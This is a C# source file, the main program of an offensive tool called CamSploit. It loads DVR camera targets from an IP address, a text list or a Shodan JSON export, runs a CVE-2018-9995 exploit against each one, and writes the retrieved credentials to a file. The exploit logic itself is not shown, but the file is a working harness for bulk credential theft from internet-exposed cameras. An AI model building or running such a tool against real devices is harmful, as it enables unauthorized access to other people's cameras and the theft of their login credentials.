using System.Collections.Generic;

namespace CamSploit
{
	public static class Program
	{
		static void Main(string[] args)
		{
            //We select the output
            using (var writter = new Writter("output.txt"))
            {
                IEnumerable<Camera> cams;
                    
                //We select the exploits
	            var exploits = new List<IExploit> {new CVE_2018_9995()};
                
	            //input: ip command line
                cams = CamLoader.LoadFromHost("192.168.1.1", "80");
                
                //input: txt file
                cams = CamLoader.LoadFromTextFile("list.txt");
                
                //input: shodan file
                cams = CamLoader.LoadFromShodanJsonFile("data.json");

                foreach (var cam in cams)
                {
                    foreach (var e in exploits)
                        RunForCamera(cam, writter, e);
                }
            }
        }

        static void RunForCamera(Camera cam, Writter writter, IExploit e)
        {
            writter.InitTest(e.CVE, cam);
            
            var credencials = e.Exploit(cam.UrlHTTP);

            if (credencials != null)
                writter.TestSuccess(e.CVE, cam, credencials);
            else
                writter.TestFailed(e.CVE, cam);
        }
	}
}